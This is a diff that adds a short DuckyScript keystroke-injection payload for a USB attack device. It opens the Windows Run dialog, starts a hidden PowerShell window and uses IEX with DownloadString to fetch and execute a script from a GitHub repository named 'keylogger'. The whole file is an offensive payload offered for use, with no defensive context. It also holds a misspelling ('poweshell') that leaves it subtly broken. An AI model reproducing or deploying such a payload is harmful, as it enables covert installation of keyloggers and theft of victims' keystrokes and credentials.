@@ -1,0 +1,8 @@
+DELAY 200
+GUI r
+DELAY 50
+STRING poweshell -WindowStyle hidden
+ENTER
+DELAY 350
+STRING IEX (New-Object Net.WebClient).DownloadString('https://github.com/ASL-rgb/keylogger/blob/main/install_python.ps1')
+ENTER
